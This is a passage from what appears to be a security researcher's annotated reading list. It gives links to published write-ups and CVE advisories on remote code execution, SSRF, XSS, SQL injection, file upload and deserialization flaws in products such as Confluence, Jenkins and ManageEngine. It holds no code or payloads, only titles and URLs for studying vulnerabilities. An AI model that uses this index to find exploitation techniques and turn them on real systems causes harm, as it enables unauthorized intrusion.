- [Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js](https://www.usenix.org/system/files/sec23summer_432-shcherbakov-prepub.pdf)
- [Case of Admin Bypass for RCE, XSS, and Information Disclosure](https://caffeinevulns.com/rces-and-acpvs/)
- [Vulnerabilities In Apache Batik Default Security Controls – SSRF And RCE Through Remote Class Loading](https://www.zerodayinitiative.com/blog/2022/10/28/vulnerabilities-in-apache-batik-default-security-controls-ssrf-and-rce-through-remote-class-loading)
- [23000$ for Authentication Bypass & File Upload & Arbitrary File Overwrite](https://medium.com/@h4x0r_dz/23000-for-authentication-bypass-file-upload-arbitrary-file-overwrite-2578b730a5f8)
- [CVE-2022–36635 — A SQL Injection in ZKSecurityBio to RCE](https://medium.com/stolabs/cve-2022-36635-a-sql-injection-in-zksecuritybio-to-rce-c5bde2962d47)
- [The Tale Of SSRF To RCE on .GOV Domain](https://medium.com/@tobydavenn/the-tale-of-ssrf-to-rce-on-gov-domain-191185b32b37)
- [How I found my first SSRF to RCE!](https://medium.com/@0x0Asif/how-i-found-my-first-rce-8f8033883dc4)
- [File Upload Bypass to RCE == $$$$](https://sagarsajeev.medium.com/file-upload-bypass-to-rce-76991b47ad8f)
- [(ZOHO) Manage Engine Desktop Central – SQL Injection / Arbitrary File Write](https://labs.jumpsec.com/zoho-manage-engine-desktop-central-sql-injection-arbitrary-file-write/)
- [Path Traversal / Arbitrary File Write](https://labs.jumpsec.com/zoho-manageengine-desktop-central-path-traversal-arbitrary-file-write/)
- [Researching Open Source apps for XSS to RCE flaws](https://swarm.ptsecurity.com/researching-open-source-apps-for-xss-to-rce-flaws/)
- [WordPress Transposh: Exploiting a Blind SQL Injection via XSS - RCE Security](https://www.rcesecurity.com/2022/07/WordPress-Transposh-Exploiting-a-Blind-SQL-Injection-via-XSS/)
- [Remote Code Execution via Prototype Pollution in Blitz.js](https://blog.sonarsource.com/blitzjs-prototype-pollution/)
- [CVE-2022-28219: Unauthenticated XXE to RCE and Domain Compromise in ManageEngine ADAudit Plus](https://www.horizon3.ai/red-team-blog-cve-2022-28219/)
- [CVE-2022-31749: WatchGuard Authenticated Arbitrary File Read/Write (Fixed)](https://www.rapid7.com/blog/post/2022/06/23/cve-2022-31749-watchguard-authenticated-arbitrary-file-read-write-fixed/)
- [From open redirect to RCE in one week](https://medium.com/@byq/from-open-redirect-to-rce-in-one-week-66a7f73fd082)
- [2nd RCE and XSS in Apache Struts before 2.5.30](https://mc0wn.blogspot.com/2022/05/2nd-rce-and-xss-in-apache-struts-before-2530.html)
- [RCE via Dependency Confusion](https://systemweakness.com/rce-via-dependency-confusion-e0ed2a127013)
- [Meta's SparkAR RCE Via ZIP Path Traversal](https://blog.fadyothman.com/metas-sparkar/)
- [From XSS to RCE (dompdf 0day)](https://positive.security/blog/dompdf-rce)
- [Achieving Remote Code Execution via Unrestricted File Upload](https://medium.com/@haroonhameed_76621/achieving-remote-code-execution-via-unrestricted-file-upload-6050f360c218)
- [Remote Code Execution in .tgz File Upload](https://machevalia.blog/blog/remote-code-execution-in-tgz-file-upload)
- [File Upload to RCE](https://ahmed8magdy.medium.com/file-upload-to-rce-538bb4128062)
- [VMware vCenter earlier versions (7.0.2.00100) has unauthorized arbitrary file read + ssrf + xss vulnerability](https://github.com/l0ggg/VMware_vCenter)
- [Unrestricted File Upload Leads to SSRF and RCE](https://itsfading.github.io/posts/Unrestricted-File-Upload-Leads-to-SSRF-and-RCE/)
- [How I Escalated a Time-Based SQL Injection to RCE](https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398)
- [$8,000 Bug Bounty Highlight: XSS to RCE in the Opera Browser](https://blogs.opera.com/security/2021/09/8000-bug-bounty-highlight-xss-to-rce-in-the-opera-browser)
- [OVE-20210809-0001 Visual Studio Code .ipynb Jupyter Notebook XSS (Arbitrary File Read)](https://github.com/justinsteven/advisories/blob/master/2021_vscode_ipynb_xss_arbitrary_file_read.md)
- [Escalating XSS to Arbitrary File Read](https://www.pethuraj.com/blog/escalating-xss-to-arbitrary-file-read/)
- [Account takeover via stored XSS with arbitrary file upload](https://0xbadb00da.medium.com/account-takeover-via-stored-xss-with-arbitrary-file-upload-2774ec6cff51)
- [GitLab Arbitrary File Read & Write through Kroki - CVE-2021-22203](https://ledz1996.gitlab.io/blog/writeups/CVE-2021-22203-gitlab-arbitrary-file-read-write-through-kroki)
- [Just Gopher It: Escalating a Blind SSRF to RCE for $15k](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)
- [Exploiting Unrestricted File Upload to achieve Remote Code Execution on a bug bounty program](https://mase289.medium.com/exploiting-unrestricted-file-upload-to-achieve-remote-code-execution-on-a-bug-bounty-program-85661516712)
- [Chaining an Blind SSRF bug to Get an RCE](https://notifybugme.medium.com/chaining-an-blind-ssrf-bug-to-get-an-rce-92c09de3c0ba)
- [Facebook Messenger Desktop App Arbitrary File Read](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [WonderCMS 3.1.3 - Authenticated RCE & Blind SSRF Vulnerability](https://zetc0de.github.io/post/authenticated-rce-ssrf-wondercms/)
- [CSRF to RCE bug chain in Prestashop v1.7.6.4 and below](https://blog.stazot.com/prestashop-csrf-to-rce-article/)
- [CVE-2019-18426 - WhatsApp Vulnerabilities Disclosure - Open Redirect + CSP Bypass + Persistent XSS + FS read permissions + potential for RCE](https://weizman.github.io/2020/02/14/whatsapp-vuln/)
- [XSS to RCE in Atlassian Hipchat](https://maustin.net/2015/11/12/hipchat_rce.html)

### 2.7 Doctrine & research roundups

3 entries.

- [SSD Advisory –  Roundcube MarkAsJunk RCE](https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/)
- [Anatomy of an IoT Exploit, from Hands-On to RCE](https://www.klogixsecurity.com/scorpion-labs-blog/anatomy-of-an-iot-exploit-from-hands-on-to-rce)
- [Pre-Auth RCE in Aspera Faspex: Case Guide for Auditing Ruby on Rails](https://blog.assetnote.io/2023/02/02/pre-auth-rce-aspera-faspex/)
## 3. Modern hardening-era cases (post-2017, bibliographic)

Modern counterparts of the corpus lanes, cited by the hunt-rce / hunt-deserialization
/ hunt-llm-ai skills and the vault's own P4 fingerprints. URLs verified live this build
(some from the fetched bugbountyhunting.com index). Never counted in class totals.

- Metabase — pre-auth RCE via environment-variable setup token, CVE-2023-38646:
  https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
- OpenSSH — RCE in forwarded ssh-agent (signal-handler code injection), CVE-2023-38408:
  https://blog.qualys.com/vulnerabilities-threat-research/2023/07/19/cve-2023-38408-remote-code-execution-in-opensshs-forwarded-ssh-agent
- Atlassian Confluence — OGNL/SSTI pre-auth RCE, CVE-2023-22527:
  https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/
- Spring Kafka — deserialization RCE, CVE-2023-34040:
  https://pyn3rd.github.io/2023/09/15/CVE-2023-34040-Spring-Kafka-Deserialization-Remote-Code-Execution/
- GiveWP (WordPress) — PHP object injection (POP) to RCE, CVE-2024-5932:
  https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/
- XWiki — arbitrary code injection, CVE-2023-35150 (ZDI):
  https://www.zerodayinitiative.com/blog/2023/8/22/cve-2023-35150
- Log4Shell-class RCE bounty case ($24,000 on Apple App Store stack):
  https://medium.com/@meharhuzaifa777/exploiting-log4j-rce-in-apple-app-store-ca99a549de1f
- Laravel — PHP deserialization attacks & new gadget chain (Quarkslab):
  https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html
- Ruby — unsafe deserialization research (Plenum Labs):
  https://medium.com/@plenumlab/identifying-and-exploiting-unsafe-deserialization-in-ruby-97dd1b1c9f4d
- Bitbucket Server — pre-auth remote command execution CVE-2022-36804 (Assetnote):
  https://blog.assetnote.io/2022/09/14/rce-in-bitbucket-server/
- Netgear — unauthenticated command injection (Flatt Security PSV-2022-0044):
  https://flattsecurity.medium.com/finding-bugs-to-trigger-unauthenticated-command-injection-c78a0f1f4afc
- Microweber — SSTI to RCE, CVE-2023-1877:
  https://cupc4k3.medium.com/cve-2023-1877-rce-with-server-side-template-injection-in-microweber-8b48a06a2b05
- NodeJS 'Eta' templating engine — RCE CVE-2022-25967:
  https://rayhan0x01.github.io/ctf/2023/04/01/finding-rce-in-eta-cve-2022-25967.html
- Jenkins — file-read → RCE through agents, CVE-2024-43044 (Conviso):
  https://blog.convisoappsec.com/en/analysis-of-cve-2024-43044/
- Moodle — pre-auth RCE (RedTeam Pentesting 2024):
  https://blog.redteam-pentesting.de/2024/moodle-rce/

## 4. Dropped from §2 (selection record)

~31 raw matches dropped: 31 web.archive.org mirrors of already-listed canonical links.
The full raw pool is saved at `archive/` as `blog-raw-matches.json` in the build workspace
(643 entries pre-dedupe).
